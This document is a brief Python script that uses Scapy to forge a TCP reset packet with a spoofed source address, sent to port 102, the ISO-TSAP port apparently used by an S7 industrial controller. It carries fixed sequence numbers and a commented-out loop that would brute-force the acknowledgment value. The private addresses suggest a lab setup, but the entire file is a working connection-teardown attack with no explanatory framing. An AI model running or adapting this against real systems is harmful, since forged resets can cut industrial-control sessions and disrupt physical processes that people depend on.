from scapy.all import *

src_ip = "192.168.56.113"
dst_ip = "192.168.56.114"
src_port = 57466
dst_port = 102

seq = 748204115
ack = 1318239129
flag = "R"

ip = IP(src=src_ip, dst=dst_ip)
tcp = TCP(sport=src_port, dport=dst_port, seq=seq, ack=ack, flags=flag)
pkt = ip/tcp

# while True:
#     pkt[TCP].ack += 173
#     send(pkt)

send(pkt)